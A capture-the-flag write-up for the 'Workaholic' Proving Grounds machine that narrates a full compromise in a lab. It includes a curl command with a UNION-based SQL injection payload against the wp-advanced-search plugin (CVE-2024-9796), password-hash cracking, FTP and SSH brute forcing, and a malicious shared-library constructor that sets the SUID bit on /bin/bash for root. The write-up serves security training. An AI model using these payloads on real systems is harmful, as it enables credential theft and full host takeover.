---
layout: post
title: "Workaholic - Proving Grounds Practice"
summary: "Wordpress wp-scan (WP Scan) → wp-advanced-search 3.3.8 → CVE-2024-9796 → SQL Injection → Obtain PHP Hashes for users → Crack with hashcat -m 400 → FTP Brute Force → Read wp-config.php file → SSH Brute force → user shell → SUID Bit wp-monitor → strings to detect .so file → Malicious C code → Shared Library (Shared Object .so) Injection → root"
---

# Workaholic - Proving Grounds Practice

## Enumeration
### Nmap
Initial nmap scan revealed SSH, FTP and HTTP ports were open. It showed that website was using wordpress.

<img width="989" height="350" alt="00 - nmap and wp" src="https://github.com/user-attachments/assets/5d190339-1a0e-456d-912e-cd164f825628" />

### Web Enumeration
I visited the web page and found a button linked to a sample page.

<img width="1280" height="621" alt="01 - web" src="https://github.com/user-attachments/assets/450940b4-e7aa-4639-abc5-ca33d0839468" />

It was forwarding me to a domain. So I added it to `/etc/hosts` file.

<img width="1293" height="689" alt="02 - sample page" src="https://github.com/user-attachments/assets/5866ff56-384e-423b-b1d2-538de5985897" />

<img width="1043" height="225" alt="03 - etc hosts" src="https://github.com/user-attachments/assets/fb9f4505-99bf-4850-864d-7bcfb08a2dee" />

## Exploitation
### Wpscan
I then executed `wpscan` against the target domain and found 3 usernames.

<img width="686" height="358" alt="05 - wpscan" src="https://github.com/user-attachments/assets/ea6aef7d-20dd-4fe7-8331-e5f000cc1a65" />

<img width="894" height="310" alt="06 - users" src="https://github.com/user-attachments/assets/4573502b-9ee6-4410-8883-fd024567cec7" />

Then used `wpscan` to bruteforce them. However, it revealed `wp-advanced-search` plugin was outdated.

<img width="771" height="194" alt="08 - wp-advanced-search" src="https://github.com/user-attachments/assets/504b8762-f8bf-47da-b94e-f27353aa4915" />

### CVE-2024-9796 (WP-Advanced-Search)
The plugin does not sanitize and escape the t parameter before using it in a SQL statement, allowing unauthenticated users to perform SQL injection attacks

Then while searching, I found [an exploit on wpscan page](https://wpscan.com/vulnerability/2ddd6839-6bcb-4bb8-97e0-1516b8c2b99b/). 

<img width="1901" height="944" alt="09 - exploit" src="https://github.com/user-attachments/assets/58e1c560-518c-4ff5-b9f1-9a4e8d2e21be" />

Then simply executed below command to obtain both usernames and hashed passwords.
```bash
curl "https://wordpress.ddev.site/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20wp_users%20UNION%20SELECT%20user_pass%20FROM%20wp_users--&f=user_login&type=&e"
```

### Crack Wordpress Hashes
Then used `hashcat` to crack wordpress hashes using `-m 400` option. And obtained 2 passwords.

<img width="1358" height="753" alt="11 - passwords" src="https://github.com/user-attachments/assets/da24868c-2825-4a63-bcb3-93e7574c19cc" />

### FTP Brute Force
Then using previously obtained usernames and cracked passwords, I brute forced FTP login and found a valid credential.

<img width="1720" height="276" alt="12 - ftp brute" src="https://github.com/user-attachments/assets/c23a0b73-852e-46af-b72f-8bee43b44d86" />

The FTP server was showing the web root of wordpress web page. So, I downloaded the `wp-config.php` file.

<img width="716" height="651" alt="14 - ftp" src="https://github.com/user-attachments/assets/63a73278-6ef4-4081-83e3-3dd3fa0cf746" />

It contained a password.

<img width="768" height="522" alt="15 - password" src="https://github.com/user-attachments/assets/f37a282e-1d7f-46cb-9b65-23086c6c19fd" />

Using this password, I tried brute forcing different users and obtained valid credential set for `charlie` user on SSH port. Then I simply logged in and read the flag.

<img width="847" height="672" alt="16 - charlie" src="https://github.com/user-attachments/assets/60274c34-46f3-4ed7-b96c-b566a1e2559e" />

## Privilege Escalation
### SUID bit on wp-monitor
There was an SUID bit on `wp-monitor` binary.

<img width="791" height="260" alt="17 - suid" src="https://github.com/user-attachments/assets/263229ee-9261-4a7c-a5b2-ceed18a7ad4d" />

I used `strings` to understand binary and found that it was probably loading a shared library.

<img width="787" height="665" alt="18 - strings sus" src="https://github.com/user-attachments/assets/f425b178-6d0d-4213-86d4-9a35f909ac47" />

So at first I created necessary folder for shared library.

<img width="636" height="211" alt="19 - mkdir  lib under ted" src="https://github.com/user-attachments/assets/472765fe-dcf8-4f5e-8181-ef18be0ed3fd" />

Then I compiled a malicious C file as .so shared library.

```c
#include <stdio.h>
#include <stdlib.h>

static void func() __attribute__ ((constructor));

static void func() {
   setuid(0); 
   system("chmod +s /bin/bash");
}
```

```bash
gcc -shared -fPIC -Wall -o /desired/path/to/library.so library.c
```

And after transfering the shared library and executing the wp-monitor again, I obtained the root shell.

<img width="879" height="528" alt="20 - gg" src="https://github.com/user-attachments/assets/7e814264-58f5-4792-bc52-3897ac12fcee" />
